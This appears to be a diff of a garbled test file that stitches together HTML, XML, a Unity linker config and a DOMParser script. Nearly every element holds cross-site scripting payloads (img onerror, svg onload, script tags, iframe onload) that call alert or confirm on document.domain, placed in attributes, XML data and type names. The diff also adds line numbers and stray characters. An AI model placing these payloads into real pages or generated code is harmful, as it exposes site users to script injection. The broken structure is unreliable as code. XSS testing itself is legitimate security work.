@@ -1,46 +1,179 @@
+1
+
 <html>
+
+2
+
   <body>
-  <img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><img src=ℹ️ onerror=alert(document.domain)><script>alert(document.domain)</script>
+
+3
+
+  <img src="http://ignaciothayer.com/" onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><img src=ℹ️ onerror=alert(document.domain)><script>alert(document.domain)</script>
+
+4
+
   </body>
+
+5
+
 </html>  
+
+6
+
   
+
+7
+
   <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+
+8
+
 <root testAttr="testValue">
+
+9
+
   <result>
+
+10
+
     <child>data1</child>
+
+11
+
     <child>ℹ️.svg</child>
+
+12
+
     <child>
+
+13
+
       <internal>
+
+14
+
        <data><svg><style>{font-family&colon;'<iframe/onload=confirm(document.domain)>'</data>
-       <data><img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><script>alert(document.domain)</script>ℹ️</data>
+
+15
+
+       <data><img src="http://ignaciothayer.com/" onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><script>alert(document.domain)</script>ℹ️</data>
+
+16
+
        <unique><img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><script>alert(document.domain)</script>ℹ️</unique>
+
+17
+
 </internal>
+
+18
+
     </child>
+
+19
+
   </result>
+
+20
+
 </root>
 
+21
+
+​
+
+22
+
 <linker>
+
+23
+
        <assembly fullname="UnityEngine">
+
+24
+
                <type fullname="UnityEngine.<img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><img src=ℹ️ onerror=alert(document.domain)><script>alert(document.domain)</script>" preserve="all"/>
+
+25
+
                <type fullname="UnityEngine.<img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><img src=ℹ️ onerror=alert(document.domain)><script>alert(document.domain)</script>" preserve="all"/>
+
+26
+
        </assembly>
+
+27
+
 </linker>
+
+28
+
 <!DOCTYPE html>
+
+29
+
 <html>
+
+30
+
 <body>
+
+31
+
+​
+
+32
 
 <p id="ℹ️.svg"></p>
 
+33
+
+​
+
+34
+
 <script>
+
+35
+
 var parser, xmlDoc;
+
+36
+
 var text = "<img src=ℹ️.svg onerror=alert(document.domain)>ℹ️<svg/onload=alert(document.domain)><img src=ℹ️.svg onerror=alert(document.domain)><script>alert(document.domain)</script>";
 
+37
+
+​
+
+38
+
 parser = new DOMParser();
+
+39
+
 xmlDoc = parser.parseFromString(text,"text/xml");
 
+40
+
+​
+
+41
+
 document.getElementById("ℹ️.svg").innerHTML =
+
+42
+
 xmlDoc.getElementsByTagName("title")[0].childNodes[0].nodeValue;
+
+43
+
 </script>
 
+44
+
+​
+
+45
+
 </body>
-</html>
